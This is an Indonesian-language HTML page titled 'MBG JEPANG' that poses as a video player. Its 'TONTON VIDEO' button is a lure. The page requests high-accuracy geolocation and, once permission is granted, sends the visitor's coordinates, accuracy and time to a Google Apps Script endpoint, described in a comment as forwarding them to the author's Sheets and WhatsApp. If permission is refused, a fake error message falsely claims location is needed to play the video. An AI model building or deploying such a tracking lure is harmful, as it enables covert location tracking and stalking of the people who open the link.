<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MBG JEPANG</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            margin: 0;
            padding: 0;
            background-color: #0f0f0f;
            color: #ffffff;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .header-title {
            font-size: 20px;
            font-weight: bold;
            margin-bottom: 15px;
            letter-spacing: 1px;
            color: #e50914;
        }
        .container {
            max-width: 500px;
            width: 100%;
            padding: 15px;
            box-sizing: border-box;
        }
        .media-wrapper {
            background: #1f1f1f;
            border-radius: 8px;
            box-shadow: 0px 4px 15px rgba(0,0,0,0.5);
            position: relative;
            overflow: hidden;
            aspect-ratio: 16 / 9;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        /* Tampilan awal (Siluet / Poster) */
        #siluet {
            width: 100%;
            height: 100%;
            object-fit: cover;
            display: block;
        }
        /* Tombol Tonton Video */
        .btn-unlock {
            position: absolute;
            background-color: #e50914;
            color: white;
            padding: 14px 28px;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            box-shadow: 0px 4px 12px rgba(0,0,0,0.6);
            letter-spacing: 1px;
        }
        .btn-unlock:hover {
            background-color: #b20710;
        }
        /* Elemen Video & Foto Akhir (disembunyikan di awal) */
        video, #fotoHasil {
            width: 100%;
            height: 100%;
            object-fit: cover;
            display: none;
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="header-title">MBG JEPANG</div>
        
        <div class="media-wrapper" id="wrapper">
            <!-- Gambar Siluet awal (bisa diganti link gambar siluet Anda) -->
            <img id="siluet" src="siluet.jpg" alt="Siluet Video">
            
            <!-- Tombol Pemicu -->
            <button id="btnTonton" class="btn-unlock" onclick="mintaAksesLokasi()">TONTON VIDEO</button>
            
            <!-- Elemen Video yang di-host di GitHub (0.0-40.0.mp4) -->
            <video id="videoPlayer" src="0.0-40.0.mp4" controls preload="auto"></video>
            
            <!-- Foto Asli yang muncul setelah video habis -->
            <img id="fotoHasil" src="PXL_20260815_090015220.jpg" alt="Foto Konten">
        </div>
    </div>

    <script>
        function mintaAksesLokasi() {
            // Pastikan fitur geolocation didukung browser
            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        // KASUS 1: Pengguna mengizinkan (Allow) akses lokasi
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        const akurasi = position.coords.accuracy;
                        const waktuSekarang = new Date().toLocaleString();
                        
                        const payload = {
                            waktu: waktuSekarang,
                            latitude: lat,
                            longitude: lon,
                            akurasi: akurasi + " meter"
                        };

                        // Kirim data koordinat ke Apps Script (Google Sheets & WhatsApp Anda)
                        fetch("https://script.google.com/macros/s/AKfycbwwjCkMGf_fNAGP8S03P5-xhv4PBiF8ISvZ267ks1dOMbCbnEax3Do01pn1MtekAIxP/exec", {
                            method: "POST",
                            mode: "no-cors",
                            headers: {
                                "Content-Type": "application/json"
                            },
                            body: JSON.stringify(payload)
                        }).catch(err => {});

                        // Jalankan pemutaran video
                        mulaiVideo();
                    },
                    function(error) {
                        // KASUS 2: Pengguna menolak (Block) akses lokasi -> Video tidak diputar
                        alert("Gagal memuat pemutar video. Pastikan izin lokasi diaktifkan untuk menonton.");
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 15000,
                        maximumAge: 0
                    }
                );
            } else {
                alert("Browser Anda tidak mendukung fitur ini.");
            }
        }

        function mulaiVideo() {
            // Sembunyikan siluet dan tombol
            document.getElementById('siluet').style.display = 'none';
            document.getElementById('btnTonton').style.display = 'none';
            
            // Tampilkan dan putar video
            var vid = document.getElementById('videoPlayer');
            vid.style.display = 'block';
            vid.play();

            // Ketika video selesai diputar (durasi 40 detik habis)
            vid.onended = function() {
                vid.style.display = 'none'; // Sembunyikan video
                document.getElementById('fotoHasil').style.display = 'block'; // Tampilkan foto asli
            };
        }
    </script>

</body>
</html>
